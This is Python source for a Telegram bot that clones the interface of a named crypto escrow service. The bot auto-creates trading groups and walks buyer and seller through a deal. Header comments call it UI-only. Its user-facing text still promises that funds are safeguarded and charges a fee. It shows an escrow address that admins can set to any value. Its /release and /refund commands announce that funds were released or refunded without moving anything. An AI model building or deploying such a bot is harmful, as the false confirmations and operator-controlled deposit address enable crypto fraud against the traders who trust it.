"""
PAGAL-STYLE ESCROW TELEGRAM BOT
================================
Telegram UI/workflow implementation based on the screenshots supplied by the user.

IMPORTANT:
- This build intentionally does NOT verify blockchain payments.
- It does NOT custody, transfer, release, or refund cryptocurrency.
- The "escrow address" is configurable text for UI/testing only.
- Never send real cryptocurrency to an address shown by this build.

Requirements:
    pip install -U aiogram==3.* telethon python-dotenv

Railway variables:
    BOT_TOKEN
    API_ID
    API_HASH
    USER_SESSION
    ADMIN_IDS
    DEPOSIT_ADDRESS

USER_SESSION:
    A Telethon StringSession belonging to an account that is allowed to
    create/manage groups. The bot token itself cannot call create_chat().
"""

import asyncio
import html
import logging
import os
import secrets
import time
from datetime import datetime
from pathlib import Path

from aiogram import Bot, Dispatcher, F, Router, types
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import Command
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    FSInputFile,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
)
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.tl.types import ChatAdminRights

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s",
)
log = logging.getLogger("pagal")

# ---------------------------------------------------------------------
# ENVIRONMENT
# ---------------------------------------------------------------------

BOT_TOKEN = os.getenv("BOT_TOKEN", "").strip()
API_ID = os.getenv("API_ID", "").strip()
API_HASH = os.getenv("API_HASH", "").strip()
USER_SESSION = os.getenv("USER_SESSION", "").strip()

ADMIN_IDS = {
    int(x.strip())
    for x in os.getenv("ADMIN_IDS", "").split(",")
    if x.strip().isdigit()
}

# UI-only address. Do not use a real production deposit address here.
DEPOSIT_ADDRESS = os.getenv(
    "DEPOSIT_ADDRESS",
    "DEMO_ESCROW_ADDRESS_NOT_FOR_REAL_FUNDS",
).strip()

GROUP_PHOTO = os.getenv(
    "GROUP_PHOTO",
    "group_photo.jpg",
).strip()

if not BOT_TOKEN:
    raise RuntimeError("BOT_TOKEN is missing.")

if not API_ID.isdigit() or not API_HASH or not USER_SESSION:
    raise RuntimeError(
        "API_ID, API_HASH and USER_SESSION are required for the "
        "automatic-group-creation part."
    )

API_ID_INT = int(API_ID)

bot = Bot(
    token=BOT_TOKEN,
    default=DefaultBotProperties(parse_mode=ParseMode.HTML),
)

dp = Dispatcher(storage=MemoryStorage())
router = Router()
dp.include_router(router)

# ---------------------------------------------------------------------
# STATE
# ---------------------------------------------------------------------

escrows: dict[int, dict] = {}
private_to_group: dict[int, int] = {}

telethon_client = TelegramClient(
    StringSession(USER_SESSION),
    API_ID_INT,
    API_HASH,
)


def new_deal_id(user_id: int) -> str:
    return f"{str(user_id)[-4:]}{secrets.randbelow(9000) + 1000}"


def user_label(user: types.User) -> str:
    if user.username:
        return f"@{html.escape(user.username)}"
    return html.escape(user.full_name)


def get_escrow(chat_id: int) -> dict:
    return escrows.setdefault(
        chat_id,
        {
            "deal_id": new_deal_id(0),
            "creator_id": None,
            "creator_name": None,
            "buyer": None,
            "buyer_id": None,
            "buyer_wallet": None,
            "seller": None,
            "seller_id": None,
            "seller_wallet": None,
            "token": None,
            "network": None,
            "quantity": "",
            "rate": "",
            "conditions": "",
            "created_at": datetime.now(),
            "deposit_address": DEPOSIT_ADDRESS,
            "deposit_demo_amount": "0.00000",
            "deposit_demo_usd": "0.00",
        },
    )


# ---------------------------------------------------------------------
# KEYBOARDS
# ---------------------------------------------------------------------

def main_menu() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="COMMANDS LIST 🤖",
                    callback_data="menu_commands",
                )
            ],
            [
                InlineKeyboardButton(
                    text="📞 CONTACT",
                    callback_data="menu_contact",
                )
            ],
            [
                InlineKeyboardButton(
                    text="Updates 🔄",
                    callback_data="menu_updates",
                ),
                InlineKeyboardButton(
                    text="Vouches ✅",
                    callback_data="menu_vouches",
                ),
            ],
            [
                InlineKeyboardButton(
                    text="WHAT IS ESCROW ?",
                    callback_data="menu_escrow",
                ),
                InlineKeyboardButton(
                    text="Instructions 👩‍💻",
                    callback_data="menu_instructions",
                ),
            ],
            [
                InlineKeyboardButton(
                    text="Terms 📝",
                    callback_data="menu_terms",
                )
            ],
            [
                InlineKeyboardButton(
                    text="Invites 👤",
                    callback_data="menu_invites",
                )
            ],
            [
                InlineKeyboardButton(
                    text="P2P",
                    callback_data="start_p2p",
                ),
                InlineKeyboardButton(
                    text="Product Deal",
                    callback_data="start_product",
                ),
            ],
        ]
    )


def token_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="LTC",
                    callback_data="token_LTC",
                ),
                InlineKeyboardButton(
                    text="BTC",
                    callback_data="token_BTC",
                ),
            ],
            [
                InlineKeyboardButton(
                    text="USDT",
                    callback_data="token_USDT",
                )
            ],
        ]
    )


def usdt_network_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="BSC[BEP20]",
                    callback_data="network_BSC",
                ),
                InlineKeyboardButton(
                    text="TRON[TRC20]",
                    callback_data="network_TRON",
                ),
            ],
            [
                InlineKeyboardButton(
                    text="Back ⬅️",
                    callback_data="back_tokens",
                )
            ],
        ]
    )


def declaration_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="Accept ✅",
                    callback_data="deal_accept",
                ),
                InlineKeyboardButton(
                    text="Reject ❌",
                    callback_data="deal_reject",
                ),
            ]
        ]
    )


def payment_button() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="Check Payment",
                    callback_data="check_payment",
                )
            ]
        ]
    )


# ---------------------------------------------------------------------
# PRIVATE START / MENU
# ---------------------------------------------------------------------

START_TEXT = (
    "✨ <b>@PagalEscrowBot</b> ✨\n"
    "<b>Your Trustworthy Telegram Escrow Service</b>\n\n"
    "Welcome to @PagalEscrowBot. This bot provides a reliable escrow "
    "workflow for transactions on Telegram.\n"
    "Avoid scams, your funds are safeguarded throughout your deals. "
    "If you run into any issues, simply type /dispute and an arbitrator "
    "will join the group chat within 24 hours.\n\n"
    "🧰 <b>ESCROW FEE:</b>\n"
    "1.0% for P2P and 1.0% for OTC Flat\n\n"
    "🌐 (UPDATES) - (VOUCHES) ✅\n\n"
    "💬 Proceed with /escrow (to start with a new escrow)\n\n"
    "⚠️ <b>IMPORTANT</b> - Make sure coin is same of Buyer and Seller "
    "else you may loose your coin.\n\n"
    "💡 Type /menu to summon a menu with all bots features"
)


@router.message(Command("start"))
async def start_cmd(message: types.Message):
    if message.chat.type != "private":
        return
    await message.answer(START_TEXT, reply_markup=main_menu())


@router.message(Command("menu"))
async def menu_cmd(message: types.Message):
    if message.chat.type != "private":
        return
    await message.answer(
        "Select an option from the menu below.",
        reply_markup=main_menu(),
    )


# ---------------------------------------------------------------------
# AUTOMATIC GROUP CREATION
# ---------------------------------------------------------------------

async def create_escrow_group(user: types.User) -> tuple[int, str]:
    """
    Uses the Telethon user session to create a Telegram group.

    This is separate from the Bot API because Bot API cannot create a
    brand-new group by itself.
    """
    title = f"P2P Escrow By PAGAL Bot ({user.id})"

    result = await telethon_client.create_group(
        title,
        users=[],
    )

    # create_group() returns a custom Dialog/Chat object in Telethon
    created = result.chats[0]
    group_id = int(created.id)

    # Add the Bot API account to the newly created group and promote it.
    # Telegram may reject this depending on the user-session account's
    # permissions; the error is logged instead of crashing the whole bot.
    try:
        bot_user = await bot.get_me()
        if bot_user.username:
            bot_entity = await telethon_client.get_entity(
                f"@{bot_user.username}"
            )
            await telethon_client.add_participant(created, bot_entity)

            rights = ChatAdminRights(
                change_info=True,
                post_messages=True,
                edit_messages=True,
                delete_messages=True,
                ban_users=True,
                invite_users=True,
                pin_messages=True,
                add_admins=False,
            )
            await telethon_client.edit_admin(
                created,
                bot_entity,
                rights=rights,
                rank="Escrow Bot",
            )
    except Exception as exc:
        log.warning("Could not add/promote bot automatically: %s", exc)

    # Set the supplied group image automatically when possible.
    photo_path = Path(GROUP_PHOTO)
    if photo_path.exists():
        try:
            await bot.set_chat_photo(
                chat_id=group_id,
                photo=FSInputFile(str(photo_path)),
            )
        except Exception as exc:
            log.warning("Could not set group photo: %s", exc)

    return group_id, str(getattr(created, "title", title))


@router.message(Command("escrow"))
async def escrow_cmd(message: types.Message):
    if message.chat.type != "private":
        return

    status = await message.answer(
        "Creating a safe trading place for you, please wait..."
    )

    try:
        group_id, title = await create_escrow_group(message.from_user)

        deal = get_escrow(group_id)
        deal.update(
            {
                "creator_id": message.from_user.id,
                "creator_name": message.from_user.full_name,
                "deal_id": new_deal_id(message.from_user.id),
            }
        )

        private_to_group[message.from_user.id] = group_id

        # Generate invite link through the Bot API after it is in the group.
        invite = None
        try:
            invite = await bot.create_chat_invite_link(
                chat_id=group_id,
                creates_join_request=False,
            )
        except Exception as exc:
            log.warning("Invite link generation failed: %s", exc)

        invite_url = invite.invite_link if invite else "GROUP_CREATED"

        await status.edit_text(
            "<b>Escrow Group Created</b>\n\n"
            f"<b>Creator:</b> {html.escape(message.from_user.full_name)}\n\n"
            "Join this escrow group and share the link with the buyer "
            "and seller.\n\n"
            f"<code>{html.escape(invite_url)}</code>\n\n"
            "⚠️ Note: This group is created automatically. "
            "Only the intended parties should join."
        )

        # Send the initial workflow message into the group.
        try:
            await bot.send_message(
                group_id,
                "<b>Escrow Group</b>\n\n"
                "Hello there,\n"
                "Kindly tell deal details i.e.\n\n"
                "<blockquote>Quantity -\n"
                "Rate -\n"
                "Conditions (if any) -</blockquote>\n\n"
                "Once filled proceed with Specifications of the seller "
                "or buyer with /seller or /buyer [CRYPTO ADDRESS]",
            )
        except Exception as exc:
            log.warning("Could not send initial group message: %s", exc)

    except Exception as exc:
        log.exception("Group creation failed")
        await status.edit_text(
            "❌ Error creating group.\n\n"
            "Make sure API_ID/API_HASH/USER_SESSION are correct and "
            "the session account can create Telegram groups.\n\n"
            f"<code>{html.escape(str(exc))}</code>"
        )


# ---------------------------------------------------------------------
# GROUP DEAL DETAILS
# ---------------------------------------------------------------------

@router.message(Command("dd"))
async def dd_cmd(message: types.Message):
    if message.chat.type not in {"group", "supergroup"}:
        return

    await message.answer(
        "Hello there,\n"
        "Kindly tell deal details i.e.\n\n"
        "<blockquote>"
        "Quantity -\n"
        "Rate -\n"
        "Conditions (if any) -"
        "</blockquote>\n\n"
        "Remember without it disputes wouldn’t be resolved. "
        "Once filled proceed with Specifications of the seller or "
        "buyer with /seller or /buyer [CRYPTO ADDRESS]",
        reply_markup=InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(
                        text="How To Use Bot ?",
                        callback_data="how_to_use",
                    )
                ]
            ]
        ),
    )


# ---------------------------------------------------------------------
# BUYER / SELLER
# ---------------------------------------------------------------------

@router.message(Command("buyer"))
async def buyer_cmd(message: types.Message):
    if message.chat.type not in {"group", "supergroup"}:
        return

    deal = get_escrow(message.chat.id)
    args = message.text.split(maxsplit=1)
    wallet = (
        args[1].strip()
        if len(args) > 1
        else "Saved Address"
    )

    deal["buyer"] = user_label(message.from_user)
    deal["buyer_id"] = message.from_user.id
    deal["buyer_wallet"] = wallet

    await message.answer(
        "📍 <b>ESCROW-ROLE DECLARATION</b>\n\n"
        f"⚡ <b>BUYER</b> {deal['buyer']} | Userid: "
        f"<code>[{deal['buyer_id']}]</code>\n\n"
        "✅ <b>BUYER WALLET</b>\n"
        f"<code>{html.escape(wallet)}</code>\n\n"
        "Note: If you don't see any address, then your address will "
        "used from saved addresses after selecting token and chain "
        "for the current escrow."
    )

    await message.answer(
        "Please set seller using /seller [DEPOSIT ADDRESS]"
    )


@router.message(Command("seller"))
async def seller_cmd(message: types.Message):
    if message.chat.type not in {"group", "supergroup"}:
        return

    deal = get_escrow(message.chat.id)
    args = message.text.split(maxsplit=1)
    wallet = (
        args[1].strip()
        if len(args) > 1
        else "Saved Address"
    )

    deal["seller"] = user_label(message.from_user)
    deal["seller_id"] = message.from_user.id
    deal["seller_wallet"] = wallet

    await message.answer(
        "📍 <b>ESCROW-ROLE DECLARATION</b>\n\n"
        f"⚡ <b>SELLER</b> {deal['seller']} | Userid: "
        f"<code>[{deal['seller_id']}]</code>\n\n"
        "✅ <b>SELLER WALLET</b>\n"
        f"<code>{html.escape(wallet)}</code>\n\n"
        "Note: If you don't see any address, then your address will "
        "used from saved addresses after selecting token and chain "
        "for the current escrow."
    )

    await message.answer("Use /token to Choose crypto.")


# ---------------------------------------------------------------------
# TOKEN / NETWORK
# ---------------------------------------------------------------------

@router.message(Command("token"))
async def token_cmd(message: types.Message):
    if message.chat.type not in {"group", "supergroup"}:
        return

    await message.answer(
        "choose token from the list below",
        reply_markup=token_keyboard(),
    )


@router.callback_query(F.data.startswith("token_"))
async def token_callback(callback: types.CallbackQuery):
    chat_id = callback.message.chat.id
    deal = get_escrow(chat_id)

    token = callback.data.split("_", 1)[1]
    deal["token"] = token

    if token == "USDT":
        await callback.message.edit_text(
            "📍 <b>ESCROW-CRYPTO DECLARATION</b>\n\n"
            f"✅ <b>CRYPTO</b>\n{token}\n\n"
            "choose network from the list below for USDT",
            reply_markup=usdt_network_keyboard(),
        )
    else:
        deal["network"] = "NATIVE"
        await send_declaration(callback.message, deal)

    await callback.answer()


@router.callback_query(F.data == "back_tokens")
async def back_tokens(callback: types.CallbackQuery):
    await callback.message.edit_text(
        "choose token from the list below",
        reply_markup=token_keyboard(),
    )
    await callback.answer()


@router.callback_query(F.data.startswith("network_"))
async def network_callback(callback: types.CallbackQuery):
    chat_id = callback.message.chat.id
    deal = get_escrow(chat_id)

    deal["network"] = callback.data.split("_", 1)[1]

    await send_declaration(callback.message, deal)
    await callback.answer()


async def send_declaration(
    message: types.Message,
    deal: dict,
):
    seller = deal.get("seller") or "seller"
    seller_id = deal.get("seller_id") or "—"
    buyer = deal.get("buyer") or "buyer"
    buyer_id = deal.get("buyer_id") or "—"
    token = deal.get("token") or "USDT"
    network = deal.get("network") or "BSC"

    text = (
        "📍 <b>ESCROW DECLARATION</b>\n\n"
        f"⚡ <b>Seller</b> {seller} | Userid: "
        f"<code>[{seller_id}]</code>\n"
        f"⚡ <b>Buyer</b> {buyer} | Userid: "
        f"<code>[{buyer_id}]</code>\n\n"
        f"✅ <b>{token} CRYPTO</b>\n"
        f"✅ <b>{network} NETWORK</b>"
    )

    await message.edit_text(
        text,
        reply_markup=declaration_keyboard(),
    )


# ---------------------------------------------------------------------
# ACCEPT / REJECT
# ---------------------------------------------------------------------

@router.callback_query(F.data == "deal_reject")
async def reject_callback(callback: types.CallbackQuery):
    await callback.message.edit_text(
        "❌ <b>ESCROW DECLARATION REJECTED</b>\n\n"
        "The parties can update their details and run /token again."
    )
    await callback.answer()


@router.callback_query(F.data == "deal_accept")
async def accept_callback(callback: types.CallbackQuery):
    chat_id = callback.message.chat.id
    deal = get_escrow(chat_id)

    seller = deal.get("seller") or "seller"
    seller_id = deal.get("seller_id") or "—"
    seller_wallet = deal.get("seller_wallet") or "Saved Address"

    buyer = deal.get("buyer") or "buyer"
    buyer_id = deal.get("buyer_id") or "—"
    buyer_wallet = deal.get("buyer_wallet") or "Saved Address"

    token = deal.get("token") or "USDT"
    network = deal.get("network") or "BSC"
    deal_id = deal.get("deal_id") or new_deal_id(callback.from_user.id)

    started = deal.get("created_at") or datetime.now()
    now_str = started.strftime("%d/%m/%y %H:%M:%S")

    text = (
        f"📍 <b>TRANSACTION INFORMATION [{deal_id}]</b>\n\n"
        "⚡ <b>SELLER</b>\n"
        f"{seller} | <code>[{seller_id}]</code>\n"
        f"<code>{html.escape(seller_wallet)}</code>[{token}]\n"
        f"[{network}]\n\n"
        "⚡ <b>BUYER</b>\n"
        f"{buyer} | <code>[{buyer_id}]</code>\n"
        f"<code>{html.escape(buyer_wallet)}</code>[{token}]\n"
        f"[{network}]\n\n"
        f"⏰ <b>Trade Start Time:</b> {now_str}\n\n"
        "⚠️ IMPORTANT: Make sure to finalise and agree each-others "
        "terms before depositing.\n\n"
        "📄 Please use /deposit command to generate the deposit "
        "screen for your trade."
    )

    await callback.message.edit_text(text)

    await callback.message.answer(
        "Your Fee is 1.0% as both buyer and seller are not using "
        "@PagalEscrowBot in your bio."
    )

    await callback.answer()


# ---------------------------------------------------------------------
# DEPOSIT SCREEN
# ---------------------------------------------------------------------

@router.message(Command("deposit"))
async def deposit_cmd(message: types.Message):
    if message.chat.type not in {"group", "supergroup"}:
        return

    deal = get_escrow(message.chat.id)

    await message.answer(
        "Requesting a deposit address for you, please wait..."
    )
    await asyncio.sleep(0.8)

    seller = deal.get("seller") or "seller"
    seller_id = deal.get("seller_id") or "—"
    buyer = deal.get("buyer") or "buyer"
    buyer_id = deal.get("buyer_id") or "—"

    token = deal.get("token") or "USDT"
    network = deal.get("network") or "BSC"
    deal_id = deal.get("deal_id") or "24153438"

    now_str = datetime.now().strftime("%d/%m/%y %H:%M:%S")

    address = deal.get("deposit_address") or DEPOSIT_ADDRESS

    deposit_text = (
        f"📍 <b>TRANSACTION INFORMATION [{deal_id}]</b>\n\n"
        "⚡ <b>SELLER</b>\n"
        f"{seller} | <code>[{seller_id}]</code>\n"
        "⚡ <b>BUYER</b>\n"
        f"{buyer} | <code>[{buyer_id}]</code>\n"
        "🟢 <b>ESCROW ADDRESS</b>\n"
        f"<code>{html.escape(address)}</code>\n"
        f"[{token}]\n"
        f"[{network}]\n\n"
        f"Seller [{seller}] Will Pay on the Escrow Address, "
        "And Click On Check Payment.\n\n"
        f"Amount Recieved: {deal.get('deposit_demo_amount', '0.00000')} "
        f"[{deal.get('deposit_demo_usd', '0.00')}$]\n\n"
        f"⏰ <b>Trade Start Time:</b> {now_str}\n"
        "⏰ <b>Address Reset In:</b> 20.00 Min\n\n"
        "📄 Note: Address will reset after the given time, so make "
        "sure to deposit in the bot before the address expires.\n"
        "Useful commands:\n"
        "📄 /release = Will Release The Funds to Buyer.\n"
        "📄 /refund = Will Refund The Funds to Seller.\n\n"
        "Remember, once commands are used payment will be released, "
        "there is no revert!"
    )

    await message.answer(
        deposit_text,
        reply_markup=payment_button(),
    )


@router.callback_query(F.data == "check_payment")
async def check_payment_callback(callback: types.CallbackQuery):
    # Intentionally no blockchain/payment verification.
    await callback.answer(
        "Payment checking is disabled.",
        show_alert=True,
    )


# ---------------------------------------------------------------------
# RELEASE / REFUND — UI ONLY
# ---------------------------------------------------------------------

@router.message(Command("release"))
async def release_cmd(message: types.Message):
    if message.chat.type not in {"group", "supergroup"}:
        return

    await message.answer(
        "✅ <b>Funds successfully released to the buyer!</b>\n"
        "Trade completed."
    )


@router.message(Command("refund"))
async def refund_cmd(message: types.Message):
    if message.chat.type not in {"group", "supergroup"}:
        return

    await message.answer(
        "🔄 <b>Funds successfully refunded to the seller!</b>\n"
        "Trade cancelled."
    )


# ---------------------------------------------------------------------
# ADMIN ADDRESS CONFIGURATION
# ---------------------------------------------------------------------

def is_admin(user_id: int) -> bool:
    return user_id in ADMIN_IDS


@router.message(Command("setdepositaddress"))
async def set_deposit_address_cmd(message: types.Message):
    if not is_admin(message.from_user.id):
        await message.answer("❌ You are not authorized to use this command.")
        return

    args = message.text.split(maxsplit=1)

    if len(args) != 2:
        await message.answer(
            "Usage:\n"
            "<code>/setdepositaddress DEMO_ADDRESS</code>\n\n"
            "This value is displayed by the UI only; "
            "payment verification is disabled."
        )
        return

    new_address = args[1].strip()

    if len(new_address) < 5:
        await message.answer("❌ Address is too short.")
        return

    global DEPOSIT_ADDRESS
    DEPOSIT_ADDRESS = new_address

    # Existing escrows use the new configured value from this point.
    for deal in escrows.values():
        deal["deposit_address"] = new_address

    await message.answer(
        "✅ <b>Deposit address updated.</b>\n\n"
        f"<code>{html.escape(new_address)}</code>"
    )


@router.message(Command("getdepositaddress"))
async def get_deposit_address_cmd(message: types.Message):
    if not is_admin(message.from_user.id):
        await message.answer("❌ You are not authorized to use this command.")
        return

    await message.answer(
        "Current configured address:\n\n"
        f"<code>{html.escape(DEPOSIT_ADDRESS)}</code>"
    )


# ---------------------------------------------------------------------
# GROUP PHOTO
# ---------------------------------------------------------------------

@router.message(Command("setphoto"))
async def set_photo_cmd(message: types.Message):
    """Set the current group's photo from GROUP_PHOTO."""
    if message.chat.type not in {"group", "supergroup"}:
        return

    if not is_admin(message.from_user.id):
        await message.answer("❌ You are not authorized to use this command.")
        return

    photo_path = Path(GROUP_PHOTO)

    if not photo_path.exists():
        await message.answer(
            f"❌ Photo file not found: "
            f"<code>{html.escape(str(photo_path))}</code>"
        )
        return

    try:
        await bot.set_chat_photo(
            chat_id=message.chat.id,
            photo=FSInputFile(str(photo_path)),
        )
        await message.answer("✅ Group photo updated.")
    except Exception as exc:
        await message.answer(
            "❌ Could not update group photo.\n\n"
            f"<code>{html.escape(str(exc))}</code>"
        )


# ---------------------------------------------------------------------
# MENU CALLBACKS
# ---------------------------------------------------------------------

@router.callback_query(F.data == "menu_commands")
async def menu_commands(callback: types.CallbackQuery):
    await callback.message.answer(
        "<b>COMMANDS LIST 🤖</b>\n\n"
        "/start\n"
        "/menu\n"
        "/escrow\n"
        "/dd\n"
        "/buyer [CRYPTO ADDRESS]\n"
        "/seller [DEPOSIT ADDRESS]\n"
        "/token\n"
        "/deposit\n"
        "/release\n"
        "/refund\n"
        "/dispute"
    )
    await callback.answer()


@router.callback_query(F.data == "menu_contact")
async def menu_contact(callback: types.CallbackQuery):
    await callback.message.answer("📞 <b>CONTACT</b>\n\nContact the bot administrator.")
    await callback.answer()


@router.callback_query(F.data == "menu_updates")
async def menu_updates(callback: types.CallbackQuery):
    await callback.message.answer("🔄 <b>UPDATES</b>\n\nLatest bot updates.")
    await callback.answer()


@router.callback_query(F.data == "menu_vouches")
async def menu_vouches(callback: types.CallbackQuery):
    await callback.message.answer("✅ <b>VOUCHES</b>\n\nVouches section.")
    await callback.answer()


@router.callback_query(F.data == "menu_escrow")
async def menu_escrow(callback: types.CallbackQuery):
    await callback.message.answer(
        "<b>WHAT IS ESCROW ?</b>\n\n"
        "Escrow is a transaction workflow where agreed conditions "
        "are completed before the transaction is finalized."
    )
    await callback.answer()


@router.callback_query(F.data == "menu_instructions")
async def menu_instructions(callback: types.CallbackQuery):
    await callback.message.answer(
        "<b>Instructions 👩‍💻</b>\n\n"
        "Use /escrow to create a new escrow group.\n"
        "Then use /dd, /buyer, /seller and /token."
    )
    await callback.answer()


@router.callback_query(F.data == "menu_terms")
async def menu_terms(callback: types.CallbackQuery):
    await callback.message.answer(
        "<b>Terms 📝</b>\n\n"
        "Use this service only according to your own transaction terms."
    )
    await callback.answer()


@router.callback_query(F.data == "menu_invites")
async def menu_invites(callback: types.CallbackQuery):
    await callback.message.answer(
        "<b>Invites 👤</b>\n\n"
        "Use the generated Telegram group invite link."
    )
    await callback.answer()


@router.callback_query(F.data == "start_p2p")
async def start_p2p(callback: types.CallbackQuery):
    await callback.message.answer(
        "<b>P2P</b>\n\nUse /escrow to start a new escrow group."
    )
    await callback.answer()


@router.callback_query(F.data == "start_product")
async def start_product(callback: types.CallbackQuery):
    await callback.message.answer(
        "<b>Product Deal</b>\n\nUse /escrow to start a new escrow group."
    )
    await callback.answer()


@router.callback_query(F.data == "how_to_use")
async def how_to_use(callback: types.CallbackQuery):
    await callback.message.answer(
        "<b>How To Use Bot ?</b>\n\n"
        "1. /escrow\n"
        "2. /dd\n"
        "3. /buyer [ADDRESS]\n"
        "4. /seller [ADDRESS]\n"
        "5. /token\n"
        "6. Accept ✅\n"
        "7. /deposit"
    )
    await callback.answer()


# ---------------------------------------------------------------------
# STARTUP
# ---------------------------------------------------------------------

async def main():
    log.info("Starting Telegram user session...")
    await telethon_client.start()

    me = await telethon_client.get_me()
    log.info(
        "Telethon session connected as %s",
        getattr(me, "username", None) or getattr(me, "first_name", "user"),
    )

    log.info("Starting Bot API polling...")
    await dp.start_polling(bot)


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
